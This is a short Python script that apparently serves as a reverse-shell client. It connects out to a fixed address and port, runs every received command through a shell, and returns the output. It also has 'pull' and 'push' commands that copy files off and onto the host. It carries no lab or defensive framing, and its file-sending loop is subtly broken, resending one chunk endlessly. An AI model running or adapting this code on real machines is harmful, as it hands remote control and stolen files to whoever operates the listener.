import socket
import os
import subprocess
s=socket.socket()
host="192.168.29.236"
port=9999
s.connect((host,port))
print(os.getcwd()+">",end=" ",flush=True) # flush empties the stdout buffer without waiting for the socket to respond
s.send(str.encode(os.getcwd()+">"))
while True:
    data=str(s.recv(1024),'utf-8')
    if len(data):
        print(data)
        if data[:3]=="cd ":
            try:
                os.chdir(data[3:])
                print(os.getcwd() + "> ",end=" ",flush=True)
                s.send(str.encode(os.getcwd() + "> "))
            except Exception as e:
                s.send(str.encode("Error changing directory: " + str(e) + "\n"))
                print("Error changing directory: " + str(e) + "\n")
        elif data=="exit":break
        elif data[:4]=="pull":
            try:
                filesize = os.path.getsize(data[5:])
                s.send(str(filesize).encode().ljust(16))    # function to make the bytestream 16 bytes
                with open(data[5:],'rb') as f:
                    out=f.read(1024)
                    while out:s.send(out)
            except FileNotFoundError:
                s.send(str(-1).encode().ljust(16))
                print("file not found ",flush=True)
            except Exception as e:
                s.send(str(-2).encode().ljust(16))
                s.send(str(e).encode())
                print("error : ",e,flush=True)
            print(os.getcwd()+">",end=" ",flush=True)
            s.send(str.encode(os.getcwd()+">"))

        elif data[:4]=="push":
            filesize=int(s.recv(16).decode().strip())  #get the filesize
            if filesize>=0:
                received=0
                with open(data[5:],'wb') as f:
                    while received<filesize:
                        response=s.recv(min(1024, filesize - received))
                        f.write(response)
                        received+=len(response)
            elif filesize==-1:
                print("file not found ",flush=True)
            else:
                print(str(s.recv(1024),"utf-8"))
            print(os.getcwd()+">",end=" ",flush=True)
            s.send(str.encode(os.getcwd()+">"))
        else:
            cmd=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            out=cmd.stdout.read()+cmd.stderr.read()+str.encode("\n"+os.getcwd()+">")
            s.send(out)
            print(str(out,"utf-8"),end=" ")

s.close()